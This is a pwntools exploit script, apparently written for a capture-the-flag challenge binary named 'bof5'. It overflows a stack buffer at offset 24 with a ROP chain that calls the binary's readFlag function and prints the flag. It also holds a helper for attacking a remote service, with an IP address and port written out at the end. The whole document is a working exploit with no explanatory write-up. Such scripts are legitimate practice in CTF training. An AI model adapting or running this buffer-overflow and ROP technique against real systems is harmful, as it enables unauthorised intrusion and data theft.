from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    p.sendlineafter(b'>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './bof5'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ['urxvtc', '-e', 'sh', '-c']
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# Pass in pattern_size, get back EIP/RIP offset
offset = 24
# win = 0x00000000004011f6
# main = 0x00000000004012bb
# flag = 0x0000000000404080

rop = ROP(elf)
rop.call(elf.symbols.readFlag)
rop.call(elf.symbols.plt.puts, [elf.symbols.flag])

print(rop.dump())

# Start program
io = start()

# Build the payload
payload = flat({
    offset: [
        rop.chain()
    ]
})

# Send the payload
io.sendlineafter(b'your input:', payload)

# Got Shell?
io.interactive()

host, port = '13.214.30.13', '10006'
